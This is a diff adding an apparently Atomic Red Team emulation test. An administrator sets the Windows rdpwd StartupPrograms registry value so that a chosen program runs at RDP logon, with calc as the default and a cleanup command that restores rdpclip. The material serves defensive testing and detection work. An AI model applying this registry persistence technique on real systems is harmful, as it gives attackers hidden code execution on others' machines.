@@ -377,3 +377,20 @@ atomic_tests:
       Remove-Item -Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" -Force
     name: powershell
     elevation_required: true
+- name: Allowing custom application to execute during new RDP logon session
+  description: |
+    When a users logs in to a computer via RDP,Windows will search for the key in HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd registry
+    By default, rdpclip is the value stored. An attacker with administrator privileges can alter the value stored to allow for the custom application to execute during RDP login session.The test will allow running cal rather rdpclip when a user logs in via RDP
+  supported_platforms:
+  - windows
+  input_arguments:
+    malicious_app:
+      description: Application to be executed during successful RDP session
+      type: string
+      default: calc
+  executor:
+    command: |
+      reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /v StartupPrograms /t REG_SZ /d "#{malicious_app}"
+    cleanup_command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /v StartupPrograms /t REG_SZ /d "rdpclip"
+    name: command_prompt    
+    elevation_required: true
